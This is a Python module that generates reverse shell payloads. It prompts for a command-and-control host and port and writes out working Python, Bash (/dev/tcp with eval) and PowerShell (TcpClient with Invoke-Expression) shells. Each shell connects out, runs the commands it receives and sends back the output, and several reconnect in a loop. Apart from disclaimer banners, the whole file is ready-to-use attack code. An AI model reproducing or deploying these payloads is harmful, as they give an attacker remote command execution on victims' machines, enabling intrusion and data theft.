#!/usr/bin/env python3
"""
Payload Generator Module
Generates payloads for Windows and Linux (Educational purposes only)
"""

import os
import base64
from colorama import Fore, Style

class PayloadGenerator:
    def __init__(self):
        self.payloads_dir = "payloads"
        if not os.path.exists(self.payloads_dir):
            os.makedirs(self.payloads_dir)
    
    def print_banner(self):
        """Print payload generator banner"""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║              {Fore.YELLOW}Payload Generator{Fore.CYAN}                        ║
╠══════════════════════════════════════════════════════════════╣
║  {Fore.RED}WARNING: Use only for authorized security testing!{Fore.CYAN}        ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
    
    def generate_windows_payload(self, host, port):
        """Generate Windows reverse shell payload"""
        payload = f'''#!/usr/bin/env python3
# Windows Reverse Shell Payload
# Educational purposes only - Use only on systems you own!

import socket
import subprocess
import os
import json
import threading
import time

HOST = "{host}"
PORT = {port}

def send_heartbeat(sock):
    """Send periodic heartbeat"""
    while True:
        try:
            message = json.dumps({{
                "type": "heartbeat",
                "timestamp": time.time()
            }})
            sock.send(message.encode('utf-8'))
            time.sleep(30)
        except:
            break

def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=send_heartbeat, args=(s,), daemon=True)
        heartbeat_thread.start()
        
        while True:
            data = s.recv(4096).decode('utf-8')
            if not data:
                break
            
            # Try to parse as JSON first
            cmd = None
            try:
                message = json.loads(data)
                if message.get('type') == 'command':
                    cmd = message.get('command', '')
            except json.JSONDecodeError:
                # If not JSON, treat as raw command
                cmd = data.strip()
            
            if not cmd:
                continue
            
            # Execute command
            try:
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                output = result.stdout + result.stderr
                if not output:
                    output = f"Command executed (exit code: {{result.returncode}})"
                
                # Send JSON response
                response = json.dumps({{
                    "type": "response",
                    "data": output,
                    "returncode": result.returncode
                }})
                s.send(response.encode('utf-8'))
            except Exception as e:
                error_response = json.dumps({{
                    "type": "response",
                    "data": f"Error: {{str(e)}}"
                }})
                s.send(error_response.encode('utf-8'))
                
    except Exception as e:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    main()
'''
        return payload
    
    def generate_linux_payload(self, host, port):
        """Generate Linux reverse shell payload"""
        payload = f'''#!/usr/bin/env python3
# Linux Reverse Shell Payload
# Educational purposes only - Use only on systems you own!

import socket
import subprocess
import os
import json
import threading
import time

HOST = "{host}"
PORT = {port}

def send_heartbeat(sock):
    """Send periodic heartbeat"""
    while True:
        try:
            message = json.dumps({{
                "type": "heartbeat",
                "timestamp": time.time()
            }})
            sock.send(message.encode('utf-8'))
            time.sleep(30)
        except:
            break

def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=send_heartbeat, args=(s,), daemon=True)
        heartbeat_thread.start()
        
        while True:
            data = s.recv(4096).decode('utf-8')
            if not data:
                break
            
            # Try to parse as JSON first
            cmd = None
            try:
                message = json.loads(data)
                if message.get('type') == 'command':
                    cmd = message.get('command', '')
            except json.JSONDecodeError:
                # If not JSON, treat as raw command
                cmd = data.strip()
            
            if not cmd:
                continue
            
            # Execute command
            try:
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                output = result.stdout + result.stderr
                if not output:
                    output = f"Command executed (exit code: {{result.returncode}})"
                
                # Send JSON response
                response = json.dumps({{
                    "type": "response",
                    "data": output,
                    "returncode": result.returncode
                }})
                s.send(response.encode('utf-8'))
            except Exception as e:
                error_response = json.dumps({{
                    "type": "response",
                    "data": f"Error: {{str(e)}}"
                }})
                s.send(error_response.encode('utf-8'))
                
    except Exception as e:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    main()
'''
        return payload
    
    def generate_bash_payload(self, host, port):
        """Generate bash reverse shell payload"""
        payload = f'''#!/bin/bash
# Bash Reverse Shell Payload
# Educational purposes only - Use only on systems you own!

HOST="{host}"
PORT={port}

while true; do
    exec 3<>/dev/tcp/$HOST/$PORT
    while read line <&3; do
        output=$(eval "$line" 2>&1)
        echo "$output" >&3
    done
    exec 3<&-
    sleep 5
done
'''
        return payload
    
    def generate_powershell_payload(self, host, port):
        """Generate PowerShell reverse shell payload"""
        payload = f'''# PowerShell Reverse Shell Payload
# Educational purposes only - Use only on systems you own!

$HOST = "{host}"
$PORT = {port}

while ($true) {{
    try {{
        $client = New-Object System.Net.Sockets.TcpClient($HOST, $PORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        
        while ($true) {{
            $command = $reader.ReadLine()
            if ($command -eq $null) {{ break }}
            
            $output = Invoke-Expression $command 2>&1 | Out-String
            $writer.WriteLine($output)
            $writer.Flush()
        }}
        
        $client.Close()
    }} catch {{
        Start-Sleep -Seconds 5
    }}
}}
'''
        return payload
    
    def save_payload(self, filename, content):
        """Save payload to file"""
        filepath = os.path.join(self.payloads_dir, filename)
        with open(filepath, 'w') as f:
            f.write(content)
        return filepath
    
    def run(self):
        """Run payload generator interface"""
        self.print_banner()
        
        print(f"{Fore.YELLOW}[*] Select target platform:{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[1]{Fore.CYAN} Windows (Python){Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[2]{Fore.CYAN} Linux (Python){Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[3]{Fore.CYAN} Linux (Bash){Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[4]{Fore.CYAN} Windows (PowerShell){Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.YELLOW}[*] Select option: {Style.RESET_ALL}").strip()
        
        host = input(f"{Fore.YELLOW}[*] Enter C2 server IP/hostname: {Style.RESET_ALL}").strip()
        if not host:
            host = "127.0.0.1"
        
        port = input(f"{Fore.YELLOW}[*] Enter C2 server port (default 4444): {Style.RESET_ALL}").strip()
        if not port:
            port = "4444"
        
        try:
            port = int(port)
        except ValueError:
            print(f"{Fore.RED}[!] Invalid port, using 4444{Style.RESET_ALL}")
            port = 4444
        
        payload = None
        filename = None
        
        if choice == '1':
            payload = self.generate_windows_payload(host, port)
            filename = "windows_payload.py"
        elif choice == '2':
            payload = self.generate_linux_payload(host, port)
            filename = "linux_payload.py"
        elif choice == '3':
            payload = self.generate_bash_payload(host, port)
            filename = "bash_payload.sh"
        elif choice == '4':
            payload = self.generate_powershell_payload(host, port)
            filename = "powershell_payload.ps1"
        else:
            print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
            return
        
        if payload:
            filepath = self.save_payload(filename, payload)
            print(f"\n{Fore.GREEN}[+] Payload generated successfully!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Saved to: {filepath}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Remember: Use only for authorized testing!{Style.RESET_ALL}\n")

